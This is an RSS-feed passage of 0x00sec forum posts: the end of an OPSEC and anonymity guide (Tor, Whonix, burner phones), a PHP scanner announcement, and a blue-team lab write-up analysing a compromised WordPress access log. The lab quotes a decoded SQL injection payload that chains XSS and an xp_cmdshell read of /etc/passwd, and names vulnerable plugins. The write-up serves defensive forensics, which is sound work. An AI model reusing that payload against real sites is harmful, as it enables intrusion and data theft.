<p>We’ve got a glaring gap to address here – MAC addresses, a pivotal piece of the puzzle. Your MAC address, acting as a unique ID for your network interface, can become a tracking beacon if left unrandomized. Big players like Microsoft and Apple, along with device manufacturers, maintain logs with MAC addresses, creating a traceable trail linking devices to specific accounts. Even if you think you’ve slipped under the radar by buying your gadget “anonymously”, surveillance tactics, from CCTV footage to mobile provider antenna logs, might expose your identity.  So, randomizing your MAC becomes a non-negotiable move. Concealing both your MAC and Bluetooth addresses is paramount. Operating systems like Android, iOS, Linux, and Windows 10 offer MAC address randomization, or you can wield tools like <a href="https://github.com/alobbs/macchanger" class="inline-onebox" rel="noopener nofollow ugc">GitHub - alobbs/macchanger: GNU MAC Changer</a></p>
<p>But hold up, home routers and WiFi access points are keeping tabs on connected devices, and ISPs can remotely access and analyze this info.</p>
<p>Shifting gears to Bluetooth MAC addresses, they’re not off the hook from the tracking game. Manufacturers and OS providers log this data, potentially connecting it to sale details or accounts. Despite the safeguards in operating systems, vulnerabilities persist. To amp up your privacy and minimize tracking, consider disabling Bluetooth in the BIOS/UEFI settings or within the operating system. In the Windows realm, shutting down the Bluetooth device in the device manager can force randomization. Or, for a hassle-free solution, consider rocking a Linux system.</p>
<h3><a name="threat-analysis-3" class="anchor" href="https://0x00sec.org#threat-analysis-3"></a>Threat Analysis</h3>
<p>Now, let’s unpack Threat Analysis in layman’s terms. It’s all about getting to know your adversaries inside out and identifying what’s on the line. Picture this: the threat of your source IP, network, or fingerprint being exposed. This becomes especially critical when dealing with malware samples – slip up, and your investigation might be blown. For those donning the hat of adversary hunters, safeguarding your identity as a researcher is paramount. Some adversaries aren’t above trying to infect or exploit researchers with malware. Let’s break it down step by step:</p>
<p>Imagine you’re using Windows or macOS for your school or work research, everyday internet surfing, perhaps even employing a privacy VPN like <code>mullvad</code>. You write code, edit photos, keep things normal. Password managers, disk encryption, and backups on encrypted external disks are part of the routine. This is your main OS – clean, nothing shady. Stick to regular emails, social networks, bookmarks, visited sites, and your Wi-Fi access point. This is for your public face, providing plausible deniability when the need arises. Check out <a href="https://opsec101.org/" rel="noopener nofollow ugc">https://opsec101.org/</a></p>
<p>Next, you’ve got a private VM for malware analysis, maybe even dabbling in writing or reverse engineering malware. Same drill – encrypted traffic routing. This VM is your privacy haven, guarding against a softer adversary.</p>
<p>And then, the pièce de résistance – the <strong>Hidden OS,</strong> where you carry out anonymous activities from a VM within this clandestine setup. All network traffic from your client VM is routed through a Gateway VM, a Tor Network conductor that directs (torifies) all traffic into the Tor Network – essentially, a network “kill switch.” The VM itself, basking in internet connectivity through a Tor Network Gateway, hooks up to your cash-paid VPN service through Tor. DNS leaks to your ISP? Impossible, thanks to the isolated network that mandates a journey through Tor, come what may.</p>
<p>Sure, Tor alone might raise eyebrows on many platforms, resulting in pesky captchas, errors, and challenges. But this multi-layered approach significantly slashes the odds of your adversaries easily de-anonymizing you. Now, you might ask about using Tor over VPN instead of VPN over Tor. Well, your VPN provider is just another ISP, aware of your origin IP, making de-anonymization a breeze. Connecting to various services using the IP of a Tor Exit Node? That’s a red flag in many places.</p>
<p>Enter Whonix, a linchpin in the anonymization process. Whonix, a Linux distribution, rolls out two Virtual Machines:</p>
<ul>
<li>The Whonix Workstation (your go-to for anonymous activities)</li>
<li>The Whonix Gateway (establishing a connection to the Tor network and routing all network traffic from the Workstation through the Tor network).</li>
</ul>
<p>You’ve got two routes here – the Whonix-only route, where all traffic journeys through the Tor Network, and the Whonix hybrid route, where everything goes through a cash-paid VPN over the Tor Network. Choose your adventure wisely.</p>
<p>Hold up, an anonymous (cash-paid) VPN subscription? You’re probably thinking, “Are you kidding me?” Aren’t you the one talking shit about VPNs? Well, kind of. I’m usually referring to third-party VPNs and recommending renting a VPS to bootstrap an open-source VPN server! (Check out these guides: <a href="https://proprivacy.com/vpn/guides/create-your-own-vpn-server" rel="noopener nofollow ugc">ProPrivacy</a> and <a href="https://medium.com/press-start-to-begin/anyone-can-ssh-into-a-server-scp-files-from-it-set-up-your-own-vpn-or-all-of-the-above-471a06e310bd" rel="noopener nofollow ugc">Medium</a>) But let’s keep it real here. You need a VPN that’s not leaving any traces in the financial system back to you. This VPN will come into play later when you want to connect to various services incognito, but never directly from your IP. Why? Because trusting VPNs is like treading on thin ice. Only unleash this new VPN account when explicitly directed, and never connect to it using your usual connections. The plan is to employ this VPN within a Virtual Machine in a secure manner because, let’s face it, we don’t trust those VPN providers’ “no-logging policies.” Your origin IP should forever remain a mystery to the VPN provider.</p>
<p>This serves two crucial purposes: first, all your traffic gets a cozy cloak of anonymity through Tor, and second, by keeping your personal and digital lives on separate tracks, you dodge any accidental mix-ups.</p>
<p>Now, I’ve delved into the complexity and limitations of using VPN and Tor simultaneously in a <a href="https://0x00sec.org/t/vpn-and-tor-at-the-same-time/36790/6">previous post</a>, but let’s circle back and revisit the essentials.</p>
<p>Even the Tor project devs say a big “No” to <a href="https://support.torproject.org/faq/faq-5/#topic_faq-5" rel="noopener nofollow ugc">VPN with Tor?</a>, but only for advanced users. However, <strong>It’s complicated.</strong> It depends on your threat model and how well you configure everything. Here are the facts: your ISP is DEFINITELY logging your activities, a VPN is MAYBE logging your activities. Another fact is routing your Tor traffic through a VPN is no guarantee of hiding your Tor usage. Your Tor usage and even your browsing patterns might be revealed through traffic fingerprints. So, man, it really depends on you.</p>
<h2><a name="vulnerability-analysis-risk-assessment-4" class="anchor" href="https://0x00sec.org#vulnerability-analysis-risk-assessment-4"></a>Vulnerability Analysis &amp;&amp; Risk Assessment</h2>
<p>Now, let’s delve into identifying vulnerabilities – the weak spots adversaries are itching to exploit. The Tor Project, while a formidable force, isn’t an impervious fortress against global adversaries, as laid out in the Tor design document <a href="https://css.csail.mit.edu/6.858/2022/readings/tor-design.pdf" rel="noopener nofollow ugc">here</a>. Successful attacks against Tor have left their mark, and various advanced techniques boasting a remarkable 96% success rate in fingerprinting encrypted traffic have emerged over the years, laying bare the websites you’ve visited. Consider major platforms like Twitter and Facebook. While Tor is often associated with accessing these sites in censored countries, things get dicey when users toss in their real names, pictures, and link their accounts to personal info like emails and phone numbers. The anonymity offered by Tor starts losing its mojo in such scenarios. Moreover, platforms can employ algorithms to scrutinize your browsing behavior, spotting patterns, and potentially connecting you to other profiles.</p>
<p>Though it’s unclear if governments tap into such data, the possibility lingers. Basic information can inadvertently lead back to you. Your digital fingerprint, a unique blend of how you write, behave, click, and browse – from fonts to screen resolution, operating system, and model – can be triangulated to follow you as you navigate the web. This is what we call <code>Fingerprinting</code> – the art of identifying someone based on these behavioral patterns. Even seemingly trivial details like slangs or spelling quirks could potentially unveil your identity. Platforms like Google and Meta can leverage this information, mapping it to your past online activities. The internet is rife with pseudonyms, but the majority are anything but anonymous and can be effortlessly traced back to their real identities.</p>
<p>Also, ensure you disable Bluetooth, biometrics, webcam, and microphone. Enable BIOS/UEFI password, and disable USB/HDMI. These measures help keep things in check and fend off certain attacks. And whatever you do, don’t leave your laptop unattended in your hotel room or elsewhere. Make it as challenging as possible for anyone to tamper with it without raising alarms.</p>
<p>Now, let’s talk about something you carry every day – your phone. Phones come with IMEI (International Mobile Equipment Identity) and IMSI (International Mobile Subscriber Identity) numbers. The IMEI is tied directly to your phone, known by mobile operators, and tracked each time your phone connects to the network. Changing the IMEI is possible but not straightforward, making it easier to opt for an old burner phone for anonymity.</p>
<p>The IMSI is linked to your mobile subscription or pre-paid plan and is hardcoded on the SIM card. Like the IMEI, it’s used by apps and OS for identification. Some EU countries maintain a database of IMEI/IMSI associations for law enforcement.</p>
<p>Tracing back IMEI and IMSI to you is a reality. Mobile Operator Subscriber Logs store IMEI and IMSI, linking them to subscriber information. IMEI and IMSI, along with connection data, are logged for precise tracking through signal triangulation, unveiling connections to other known phones.</p>
<p>Manufacturers trace phone sales using IMEI. Even if bought anonymously, they can correlate this info with other phones present at the time, utilizing antenna logs. IMSI is tied to the buyer’s identity, and even in countries allowing cash purchases, details like where and when it was bought can be retrieved.</p>
<p>Google/Apple logs IMEI/IMSI tied to accounts and user history. Government agencies deploy IMSI catchers to force a specific IMSI to connect, enabling various attacks.</p>
<p>Geolocation isn’t solely done through mobile antennas triangulation; it involves WIFIs and Bluetooth devices around you. Google and Apple maintain a database of most WIFI access points and Bluetooth devices and their locations. When your smartphone is on, it scans passively (unless disabled in settings) WIFI access points and Bluetooth devices, allowing them to provide accurate locations even when GPS is off. However, this feature also lets them keep a record of all Bluetooth devices globally for tracking purposes.</p>
<p>For maximum anonymity, use a burner phone with an unlinked IMEI and an IMSI not tied to you. Purchase these in a secure location using cash, and don’t bring your primary phone during the purchase. Never power on the burner phone in a traceable location, especially not where your known smartphone is located, to maintain maximum anonymity during setup and occasional verification.</p>
<p><strong>Note:</strong> Don’t take your smartphone with you during sensitive activities if you want to keep them secret. Just leave it at home.</p>
<p>Your devices can be tracked even when powered off. Such devices continue to broadcast identity information to nearby devices using Bluetooth Low-Energy, even when they are turned off. While they don’t have direct access to the devices not connected to the internet.</p>
<p>Your devices are like silent informants, even when powered off. They persistently broadcast identity information via Bluetooth Low-Energy to nearby devices, creating a potential trail. While they lack direct access to devices not connected to the internet, their subtle transmissions reveal more than you might think.</p>
<p>Your smartphone, diligently records everything from your voice commands (“Hey Siri,” “Hey Google”) to your every move (Bluetooth devices, Wi-Fi access points), activities (steps, screen time, connected devices data), and network locations. It captures images and videos, and likely has access to your logs, including social media, messaging, and financial accounts. It’s not just your smartphone; other smart devices – Apple Watch, Android Smartwatch, fitness devices, smart speakers (Amazon Alexa), and more – join the surveillance party.</p>
<p>When gearing up for anonymous or sensitive activities, it’s prudent to leave your smart devices behind. They can identify your device and store the location in a database, which might be accessed by third parties or the devices themselves for various purposes. Even when turned off, your smartphone may not be as dormant as you think, as highlighted in this <a href="https://threatpost.com/iphones-attack-turned-off/179641/" rel="noopener nofollow ugc">threatpost article</a>.</p>
<p>Let’s talk about <code>Metadata</code> – the information about your activities without delving into the actual content. Imagine knowing you had a call from an oncologist followed by calls to family and friends. Though the conversation details elude us, the metadata hints at its nature.</p>
<p>Smartphones, operating systems (Android/IOS), browsers, apps, and websites are avid collectors of your metadata, often including your location. Numerous companies likely know your precise location at any time, courtesy of your smartphone. Additionally, files come adorned with metadata – a prime example being pictures with EXIF information containing details like GPS coordinates, device model, and precise capture time. While this may not directly unveil your identity, it could disclose your exact whereabouts at a specific moment, potentially piecing together a larger puzzle.</p>
<p>Depths of the Deep Web and Dark Web, OPSEC <a href="http://dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad.onion/post/19687954203332614950/#c-7c2f1f5af40e27b563" rel="noopener nofollow ugc">Onion</a></p>
<p>Here’s the reality check you’re not as special as you might think. Advanced techniques require considerable resources, skills, joint effort, and time, unless your goal is to overthrow the government. For most scenarios, investigations and espionage require reconnaissance and intelligence coordination, which, in itself, is time-consuming. However, once you find yourself on some list, it’s too late for OPSEC.</p>
<h1><a name="conclusion-5" class="anchor" href="https://0x00sec.org#conclusion-5"></a>Conclusion</h1>
<p>I won’t sugarcoat it achieving perfect OPSEC is an illusion. Compromises are inevitable. The key is in your dedication and the measures you’re willing to take. The more time invested and the more cautious you are, the better. Remember the basics: avoid attracting attention, stay vigilant, be patient, steer clear of laziness and ignorance, blend in, do what makes sense, and, most importantly, Shut the F* up.  <a href="https://theanarchistlibrary.org/library/crimethinc-what-is-security-culture" class="inline-onebox" rel="noopener nofollow ugc">What Is Security Culture? | The Anarchist Library</a></p>
<p>I’ve touched on the shenanigans in play. While not an exhaustive dive into every facet of attacks or vulnerabilities, consider this a 101 to kickstart your research. It’s designed to stake a claim in the recesses of your damn mind, offering a glimpse into how an OPSEC strategy should take shape against the backdrop of tools and adversary capabilities. and no matter what research you conduct or guide/tips you come across might not cut it; they could be downright irrelevant to your unique operations. So, how do you make this realistically work? Simple. Build your own OPSEC and execute drills that fit your OP. It shouldn’t consume more than a few hours in most cases. Stay sharp, stay secure.</p>
<h2><a name="references-6" class="anchor" href="https://0x00sec.org#references-6"></a>References</h2>
<ul>
<li><a href="https://irp.fas.org/nsa/ioss/threat96/index.html" rel="noopener nofollow ugc">Operations Security INTELLIGENCE THREAT HANDBOOK</a></li>
<li><a href="https://whiteprime.github.io/thgtoa/guide.html" rel="noopener nofollow ugc">Автостопом по анонимности в Интернете</a></li>
<li><a href="https://media.defense.gov/2017/Mar/24/2001721511/-1/-1/0/CIM_5510_24A.PDF" rel="noopener nofollow ugc">DHS/USCG Operations Security (OPSEC) Program</a></li>
<li><a href="https://info.publicintelligence.net/IOSS-TerrorismThreatHandbook.pdf" rel="noopener nofollow ugc">Interagency OPSEC Support Staff (IOSS) Terrorism Threat Handbook</a></li>
<li><a href="https://wikileaks.org/ciav7p1/cms/page_14587109.html" rel="noopener nofollow ugc">Vault 7: Development Tradecraft DOs and DON’Ts</a></li>
<li><a href="https://defuse.ca/truecrypt-plausible-deniability-useless-by-game-theory.htm" rel="noopener nofollow ugc">Plausible Deniability is Theoretically Useless</a></li>
</ul>
            <p><small>6 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/an-overview-of-operations-security-opsec/38328">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/an-overview-of-operations-security-opsec/38328</link>
          <pubDate>Thu, 14 Dec 2023 01:52:21 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38328</guid>
          <source url="https://0x00sec.org/t/an-overview-of-operations-security-opsec/38328.rss">An Overview of Operations security (OPSEC)</source>
        </item>
        <item>
          <title>I&#39;m curious if anyone would be willing to share their insights on a PHP vulnerability scanner?</title>
          <dc:creator><![CDATA[phpio]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>We previously shared <a href="https://0x00sec.org/t/i-was-wondering-if-anyone-would-like-to-give-their-thoughts-on-a-php-vulnerability-scanner/37932">a post</a> and wanted to inform you that we’ve added a cool new feature to the scanner.</p>
<p>Great news! You asked - we delivered! When we first started, scanning your project required you  to click the Scan button and upload your code. You could package your project and upload it as one archive file, or upload up to 15 individual PHP files.</p>
<p>Our users asked us to add integrations with GitHub and GitLab to allow automated secure code checks to your CI/CD pipeline. Voila - now you can connect PHP Secure to your repository and run automated scans directly in your workflow!</p>
<p>Adding secure code checks to your existing workflow is easy. We have included all the step-by-step instructions to make it simple. Just follow the instructions carefully to set it up without a hitch.</p>
<p>Once connected, every time it is deployed, PHP Secure will check your project for vulnerabilities. Whenever new vulnerabilities are found, you’ll be notified. You can view your scan results in your PHP Secure account.</p>
<p>Keep your applications secure and prevent deployment of vulnerable applications or components (registries) by adding PHP Secure to the build as a step in the pipeline.</p>
<p>What do you think of this new feature?</p>
<p>We strive to be on the cutting edge and offer you a superior product for years to come! Do you have any suggestions for improvement?</p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/im-curious-if-anyone-would-be-willing-to-share-their-insights-on-a-php-vulnerability-scanner/38291">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/im-curious-if-anyone-would-be-willing-to-share-their-insights-on-a-php-vulnerability-scanner/38291</link>
          <pubDate>Mon, 11 Dec 2023 00:13:50 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38291</guid>
          <source url="https://0x00sec.org/t/im-curious-if-anyone-would-be-willing-to-share-their-insights-on-a-php-vulnerability-scanner/38291.rss">I&#39;m curious if anyone would be willing to share their insights on a PHP vulnerability scanner?</source>
        </item>
        <item>
          <title>Blue Teams Lab: Log Analysis — Compromised WordPress</title>
          <dc:creator><![CDATA[alarick]]></dc:creator>
          <category>Blue-Team</category>
          <description><![CDATA[
            <h1><a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h1>
<p>This is an interesting challenge that contains an attack on a WordPress site using multiple IP addresses and techniques to breach the site. Our goal is to identify the attacker and their methods by analyzing the Apache access.log file. There are 6 question in the challenge and we will use Linux CLI to solve this.</p>
<h1><a name="analysis-2" class="anchor" href="https://0x00sec.org#analysis-2"></a>Analysis</h1>
<p>If an attacker is attacking a web application, he/she might try to login to the admin panel. If they don’t have the required credentials, they may try to brute force the account. This approach is noisy and reports a lot of login failure events in the access.log file. So first lets count the authentication failures for each IP.</p>
<pre><code class="lang-auto">cat access.log | grep "403" | cut -d " " -f 1 | sort | uniq -c | sort -nr
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/7/d73249c7fc5d8d23765feed0d71a87d83bcdcfb3.png" alt="image" data-base62-sha1="uHIoGqG8SicCP9XvsY14hxPfNl1" width="163" height="291"></p>
<p>So the IPs to investigate are 110.29.54.120, 168.22.54.119, 197.23.128.35 and 119.241.22.121</p>
<p>When we investigate the first IP in the list: 110.29.54.120 we see a large number of login failures.</p>
<pre><code class="lang-auto">cat access.log | grep "110.29.54.120"
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/4/64259e930d241eb789dabccaf773b426300c6a70.jpeg" data-download-href="/uploads/short-url/ehWltc8526x0XIvwwlMmqz2DCbC.jpeg?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/4/64259e930d241eb789dabccaf773b426300c6a70.jpeg" alt="image" data-base62-sha1="ehWltc8526x0XIvwwlMmqz2DCbC" width="690" height="340" data-dominant-color="27282A"></a></div><p></p>
<p>Anyhow the above picture contains the answer to the first question in the challenge.</p>
<p>Interestingly before all those failures, this IP successfully made a couple of logins to the admin panel. However after all those login failures, this IP tried to enumerate the contact form 7 plugin, but had no luck.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/5/9/594a4f63b77abd6090cdb5500030294a0a392d6a.png" data-download-href="/uploads/short-url/cJTHCtvFchq1SN6PhRIFFBgHU38.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/5/9/594a4f63b77abd6090cdb5500030294a0a392d6a_2_690x46.png" alt="image" data-base62-sha1="cJTHCtvFchq1SN6PhRIFFBgHU38" width="690" height="46" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/5/9/594a4f63b77abd6090cdb5500030294a0a392d6a_2_690x46.png, https://0x00sec.s3.amazonaws.com/original/3X/5/9/594a4f63b77abd6090cdb5500030294a0a392d6a.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/5/9/594a4f63b77abd6090cdb5500030294a0a392d6a.png 2x" data-dominant-color="2E2F31"></a></div><p></p>
<p>Now if we investigate the second IP: 168.22.54.119 and match the wp-login attempts using the following command, we see something that looks like an SQL injection payload.</p>
<pre><code class="lang-auto">cat access.log | grep "168.22.54.119" | grep "/wp-login.php?itsec-hb-token=adminlogin"
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/d/2daa779a84f24ff40bb21e508be6b6ae0c53c21f.jpeg" data-download-href="/uploads/short-url/6vYI31INCZXErCbVdS8gfiYyBhZ.jpeg?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/d/2daa779a84f24ff40bb21e508be6b6ae0c53c21f.jpeg" alt="image" data-base62-sha1="6vYI31INCZXErCbVdS8gfiYyBhZ" width="690" height="87" data-dominant-color="2F292A"></a></div><p></p>
<p>The payload is url encoded and if we decode it, it translates as follows:</p>
<pre><code class="lang-auto">2151+AND+1=1+UNION+ALL+SELECT+1,NULL,'&lt;script&gt;alert("XSS")&lt;/script&gt;',table_name+FROM+information_schema.tables+WHERE+2&gt;1--/**/;+EXEC+xp_cmdshell('cat+../../../etc/passwd')#
</code></pre>
<p>Please note there are few more SQLi payloads other than the one shown here. So we can suspect this attacker might have used something like sqlmap. To verify this we can isolate the user agent and analyze.</p>
<pre><code class="lang-auto">cat access.log | grep "168.22.54.119" | cut -d " " -f12-
</code></pre>
<p>And as we suspected, we can see sqlmap user agent in the logs:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/a/4a7b5d38fcb138926c78263960e05a39c8f37d00.jpeg" data-download-href="/uploads/short-url/aCTDDq4OpasacnQ00JgsqEPH6Y8.jpeg?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/a/4a7b5d38fcb138926c78263960e05a39c8f37d00.jpeg" alt="image" data-base62-sha1="aCTDDq4OpasacnQ00JgsqEPH6Y8" width="690" height="126" data-dominant-color="2E2C2E"></a></div><p></p>
<p>If you examine the SQL injection payload, it tries to get a command shell using xp_cmdshell. However, the command xp_cmdshell is a MS SQL Server command so the attacker might be assuming that the wordpress site is using MS SQL Server for linux. Please check the links below.</p>
<aside class="onebox allowlistedgeneric" data-onebox-src="https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16&amp;source=post_page-----15d9d7b883ce--------------------------------">
  <header class="source">

      <a href="https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16&amp;source=post_page-----15d9d7b883ce--------------------------------" target="_blank" rel="noopener nofollow ugc">learn.microsoft.com</a>
  </header>

  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/362;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/d/f/df50ff207e6a6ce3b4d58cdf0195308a0fb1e170_2_690x362.png" class="thumbnail" data-dominant-color="D1DDE2" width="690" height="362" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/d/f/df50ff207e6a6ce3b4d58cdf0195308a0fb1e170_2_690x362.png, https://0x00sec.s3.amazonaws.com/optimized/3X/d/f/df50ff207e6a6ce3b4d58cdf0195308a0fb1e170_2_1035x543.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/d/f/df50ff207e6a6ce3b4d58cdf0195308a0fb1e170.png 2x"></div>

<h3><a href="https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16&amp;source=post_page-----15d9d7b883ce--------------------------------" target="_blank" rel="noopener nofollow ugc">xp_cmdshell (Transact-SQL) - SQL Server</a></h3>

  <p>Spawns a Windows command shell and passes in a string for execution. Any output is returned as rows of text.</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric" data-onebox-src="https://learn.microsoft.com/en-us/sql/linux/sql-server-linux-overview?view=sql-server-ver16&amp;source=post_page-----15d9d7b883ce--------------------------------">
  <header class="source">

      <a href="https://learn.microsoft.com/en-us/sql/linux/sql-server-linux-overview?view=sql-server-ver16&amp;source=post_page-----15d9d7b883ce--------------------------------" target="_blank" rel="noopener nofollow ugc">learn.microsoft.com</a>
  </header>

  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/362;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/d/f/df50ff207e6a6ce3b4d58cdf0195308a0fb1e170_2_690x362.png" class="thumbnail" data-dominant-color="D1DDE2" width="690" height="362" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/d/f/df50ff207e6a6ce3b4d58cdf0195308a0fb1e170_2_690x362.png, https://0x00sec.s3.amazonaws.com/optimized/3X/d/f/df50ff207e6a6ce3b4d58cdf0195308a0fb1e170_2_1035x543.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/d/f/df50ff207e6a6ce3b4d58cdf0195308a0fb1e170.png 2x"></div>

<h3><a href="https://learn.microsoft.com/en-us/sql/linux/sql-server-linux-overview?view=sql-server-ver16&amp;source=post_page-----15d9d7b883ce--------------------------------" target="_blank" rel="noopener nofollow ugc">Overview of SQL Server on Linux - SQL Server</a></h3>

  <p>This article describes how SQL Server runs on Linux and provides information on how to learn more.</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>Additionally this IP had access to the admin page for a brief period of time. However it seems after trying some other SQL injection payloads, the IP got logged out of the account.</p>
<p>Another interesting thing with this IP is, it tried to enumerate two plugins, Contact Form 7 and Simple File List.</p>
<pre><code class="lang-auto">cat access.log | grep "168.22.54.119" | egrep "contact|simple"
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/8/68d8f1d0f06ea2986db87643245cf06ff29f7f7a.png" data-download-href="/uploads/short-url/eXwsqLDDrT3gnpvpeTvDR0FyisG.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/8/68d8f1d0f06ea2986db87643245cf06ff29f7f7a_2_690x27.png" alt="image" data-base62-sha1="eXwsqLDDrT3gnpvpeTvDR0FyisG" width="690" height="27" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/8/68d8f1d0f06ea2986db87643245cf06ff29f7f7a_2_690x27.png, https://0x00sec.s3.amazonaws.com/original/3X/6/8/68d8f1d0f06ea2986db87643245cf06ff29f7f7a.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/6/8/68d8f1d0f06ea2986db87643245cf06ff29f7f7a.png 2x" data-dominant-color="2F3032"></a></div><p></p>
<p>These two plugins are vulnerable to Arbitrary File Upload. This means an attacker can upload any file to the server, for example a webshell. If you simply search Contact Form 7 arbitrary file upload on duckduckgo, you will find the corresponding CVE (Link below) and that answers the 3rd question.</p>
<aside class="onebox allowlistedgeneric" data-onebox-src="https://blog.wpsec.com/contact-form-7-vulnerability/">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/6/4/648f7c48715cbf52c622873db322cb885b75dbf6.png" class="site-icon" data-dominant-color="0C86C4" width="32" height="32">

      <a href="https://blog.wpsec.com/contact-form-7-vulnerability/" target="_blank" rel="noopener nofollow ugc" title="02:34PM - 21 December 2020">WPSec – 21 Dec 20</a>
  </header>

  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/285;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/b/0bb3cc7e4529df93dd9e0097581c43fbe02c49f2_2_690x285.png" class="thumbnail" data-dominant-color="798679" width="690" height="285" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/b/0bb3cc7e4529df93dd9e0097581c43fbe02c49f2_2_690x285.png, https://0x00sec.s3.amazonaws.com/optimized/3X/0/b/0bb3cc7e4529df93dd9e0097581c43fbe02c49f2_2_1035x427.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/0/b/0bb3cc7e4529df93dd9e0097581c43fbe02c49f2.png 2x"></div>

<h3><a href="https://blog.wpsec.com/contact-form-7-vulnerability/" target="_blank" rel="noopener nofollow ugc">CVE-2020-35489: Unrestricted File Upload Vulnerability found in Contact Form...</a></h3>

  <p>A high-severity&nbsp;Unrestricted File Upload&nbsp;vulnerability, tracked as CVE-2020–35489, was discovered in a popular WordPress plugin called&nbsp;Contact Form 7, currently installed on&nbsp;5 Million+ websites&nbsp;making them vulnerable to...</p>

  <p>
    <span class="label1">Est. reading time: 4 minutes</span>
  </p>

  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>The other plugin that is vulnerable is Simple File List. If you search again for a Simple File List exploit, you can find the following link that explains the exploit and the affected version, which answers the 4th question.</p>
<p><a href="https://wpscan.com/vulnerability/365da9c5-a8d0-45f6-863c-1b1926ffd574/" class="onebox" target="_blank" rel="noopener nofollow ugc">https://wpscan.com/vulnerability/365da9c5-a8d0-45f6-863c-1b1926ffd574/</a></p>
<p>Now lets go ahead and analyze the next IP on the list, 197.23.128.35.</p>
<p>It seems this IP also had some success with admin login before getting a lockout.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/7/c73647f3cbfdba9436aaab499c36789d21df4e71.png" data-download-href="/uploads/short-url/sqjjqb9kxsmrmbDUNSQf0KRlawx.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/7/c73647f3cbfdba9436aaab499c36789d21df4e71_2_690x55.png" alt="image" data-base62-sha1="sqjjqb9kxsmrmbDUNSQf0KRlawx" width="690" height="55" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/7/c73647f3cbfdba9436aaab499c36789d21df4e71_2_690x55.png, https://0x00sec.s3.amazonaws.com/original/3X/c/7/c73647f3cbfdba9436aaab499c36789d21df4e71.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/7/c73647f3cbfdba9436aaab499c36789d21df4e71.png 2x" data-dominant-color="2A2C2D"></a></div><p></p>
<p>After the lockout, it seems this IP tried various attacks, but without a success.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/f/df5cf98f265525d509b4cbf3d75106462a59d928.jpeg" data-download-href="/uploads/short-url/vRXFLgIpnl7ut8DvZZOqPuYYKzm.jpeg?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/f/df5cf98f265525d509b4cbf3d75106462a59d928.jpeg" alt="image" data-base62-sha1="vRXFLgIpnl7ut8DvZZOqPuYYKzm" width="690" height="345" data-dominant-color="28292B"></a></div><p></p>
<p>So now, to the final IP address: 119.241.22.121. Now, a lot of things has happened with this IP as well.</p>
